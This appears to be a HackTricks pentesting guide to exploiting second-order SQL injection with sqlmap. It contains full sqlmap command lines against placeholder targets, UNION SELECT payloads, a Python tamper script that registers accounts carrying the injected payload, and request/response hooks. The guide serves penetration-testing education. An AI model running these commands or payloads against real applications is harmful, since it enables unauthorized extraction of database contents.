---
title: "Second Order Injection - SQLMap"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

# Second-Order Injection with sqlmap

```
#Get the SQL payload execution with a GET to a url
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"
#Get the SQL payload execution sending a custom request from a file
sqlmap -r login.txt -p username --second-req details.txt
```
## Finding and confirming the delayed sink

Do not stop testing when the request that stores a value succeeds. Create a record containing an unmatched delimiter such as `'`, then visit every view, export, moderation, or details endpoint that later consumes that record. If the value remains stored but one of those consumers returns an SQL error, truncates its HTML where the record should be rendered, or otherwise fails, the vulnerable query is probably in that second processing step.[\[3\]](#references)

For a reflected `UNION` sink, increment the number of selected markers until the delayed page renders again, then replace markers individually with functions such as `version()` or `user()` to locate reflected columns. This confirmation must be repeated through the full **store → retrieve → execute** flow for every payload attempt.[\[3\]](#references)

```
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3,4,5-- -
' UNION SELECT version(),user(),3,4,5-- -
```
## When the storage response redirects to the sink

Sometimes the storage `POST` returns a redirect whose `Location` is the newly created record, and that destination immediately evaluates the stored value. In that specific flow, sqlmap can observe the second-order result by following the per-attempt redirect, so a fixed `--second-url` or `--second-req` is not required. Save a benign authenticated storage request and target the stored parameter; if the `UNION` technique is already known, restricting the test reduces noise.[\[3\]](#references)

```
sqlmap -r create.req -p stored_parameter --technique U
```
When prompted, **follow the redirect**, but answer **no** to resending the original POST body if the destination is a GET-only details page. This makes sqlmap request the generated `Location` as the consumer request instead of replaying the creation body against it. A negative basic heuristic is not decisive here because the first response only stores the payload; let the selected technique test the redirected response.[\[3\]](#references)

If the redirect does not reach the actual consumer, the record requires another action, or the trigger URL is not returned dynamically, fall back to `--second-url`, `--second-req`, or a helper script for the extra state transitions.[\[1\]](#references)[\[3\]](#references)

In several cases **this won’t be enough** because you will need to **perform other actions** apart from sending the payload and accessing a different page.

When this is needed, you can use a **sqlmap tamper script**. For example, the following script registers a new user **using the sqlmap payload as the email address** and then logs out.

```
#!/usr/bin/env python
import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL
def dependencies():
    pass
def login_account(payload):
    proxies = {'http':'http://127.0.0.1:8080'}
    cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}
    params = {"username":"asdasdasd", "email":payload, "password":"11111111"}
    url = "http://10.10.10.10/create.php"
    pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)
    url = "http://10.10.10.10/exit.php"
    pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)
def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    login_account(payload)
    return payload
```
A **sqlmap tamper function runs for each payload transformation attempt and must return a payload**. In this case the auxiliary requests matter, so the function returns the payload unchanged.[\[1\]](#references)

So, if for some reason we need a more complex flow to exploit the second order SQL injection like:

- Create an account with the SQLi payload inside the “email” field
- Logout
- Login with that account (login.txt)
- Send a request to execute the SQL injection (second.txt)

**This sqlmap line will help:**

```
sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U --dbms mysql --union-char "DTEC" -a
##########
# --tamper tamper.py : Executes the tamper for each SQL injection payload
# -r login.txt : Indicates the request to send the SQLi payload
# -p email : Focus on email parameter (you can do this with an "email=*" inside login.txt
# --second-req second.txt : Request that executes the SQLi and returns the output
# --proxy http://127.0.0.1:8080 : Use this proxy
# --technique=U : Help sqlmap indicating the technique to use
# --dbms mysql : Help sqlmap indicating the dbms
# --prefix "a2344r3F'" : Help sqlmap detecting the injection indicating the prefix
# --union-char "DTEC" : Help sqlmap indicating a different union-char so it can identify the vuln
# -a : Retrieve everything; use only when the engagement scope permits it
```
## Useful switches in real second-order flows

Second-order automation usually fails because the **payload storage request works**, but the **execution request is noisy, stateful, or protected**. When that happens, the following flags are usually more useful than adding more payloads:[\[1\]](#references)

```
sqlmap -r login.txt -p email \
  --second-req second.txt \
  --csrf-token csrf \
  --csrf-url https://target.tld/profile \
  --csrf-method POST \
  --live-cookies cookies.txt \
  --safe-req keepalive.txt \
  --safe-freq 1 \
  --string "Welcome back" \
  --text-only
```
- `--csrf-token` ,`--csrf-url` ,`--csrf-method` : Useful when the store or trigger request needs a fresh anti-CSRF token on every attempt.
- `--live-cookies` : Reload cookies before each request. Useful when a browser/Burp macro is refreshing session state in the background.
- `--safe-req` and`--safe-freq` : Keep the workflow alive when the application logs you out or invalidates the session after a few failed probes.
- `--string` ,`--not-string` ,`--regexp` ,`--code` ,`--text-only` : Useful when the second-order response contains banners, ads, timestamps, or user-generated junk that makes diffing unstable.

## When `--tamper` is not enough

`--tamper` is not enough
`tamper.py` is still the easiest way to **register a payload, log out, log in again, and trigger execution**. However, on modern targets it is often cleaner to move some of the logic to **request/response hooks**:[\[1\]](#references)

- `--preprocess` : Modify the full HTTP request before it is sent. Useful when a second-order flow needs an extra nonce, an extra parameter, or header normalization.
- `--postprocess` : Clean the HTTP response before sqlmap compares it. Useful when the second-order sink is wrapped in dynamic HTML and only a small fragment is stable.

Example request/response hooks:

```
#!/usr/bin/env python
def preprocess(req):
    if req.data:
        req.data += b"&preview=1"
```
```
#!/usr/bin/env python
import re
def postprocess(page, headers=None, code=None):
    page = re.sub(br"<span>Generated at .*?</span>", b"", page or b"")
    return page, headers, code
```
## Important limitations

- Do **not assume** that`--second-req` will replay the same payload inside a`*` placeholder in the second request. If the trigger request also needs the injected value (or a derived version of it), a custom`tamper` ,`--preprocess` , or a local proxy is usually required.
- Do **not rely on**`--eval` for the second request. Official usage documents`--eval` for the primary request flow; if the second request also needs per-attempt mutations, handle them inside your helper scripts instead.<sup>[\[1\]](#references)</sup>

This pattern is especially useful when the payload is stored in places such as:[\[2\]](#references)

- Filenames or image metadata that are queried later
- Registration/profile fields later consumed by admin panels
- Sorting/filtering preferences saved server-side and replayed later
- Workflow state that is only executed after a preview, export, or moderation action

## References
